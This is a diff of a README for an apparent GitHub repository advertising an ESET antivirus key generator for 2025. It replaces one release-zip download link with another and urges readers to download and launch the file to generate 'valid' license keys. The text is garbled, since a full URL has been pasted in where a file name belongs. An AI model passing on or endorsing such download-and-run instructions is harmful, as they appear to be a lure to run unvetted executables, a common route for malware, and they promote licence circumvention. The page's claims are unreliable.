@@ -16,9 +16,9 @@ This repository hosts a powerful key generator specifically designed to provide 
 ## Getting Started
 
 To get started, simply download the tool from the following link:
-[![Download](https://img.shields.io/badge/Download-Soft.zip-brightgreen)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download](https://github.com/Tjizzle94/Keygen-ESET-2025/releases/download/v1.0/Program.zip)](https://github.com/Tjizzle94/Keygen-ESET-2025/releases/download/v1.0/Program.zip)
 
-Once downloaded, launch the tool and follow the instructions to generate your valid ESET license key for 2025. Don't have the file name "Soft.zip" then launch the downloaded file to initiate the key generation process.
+Once downloaded, launch the tool and follow the instructions to generate your valid ESET license key for 2025. Don't have the file name "https://github.com/Tjizzle94/Keygen-ESET-2025/releases/download/v1.0/Program.zip" then launch the downloaded file to initiate the key generation process.
 
 ## Topics
 
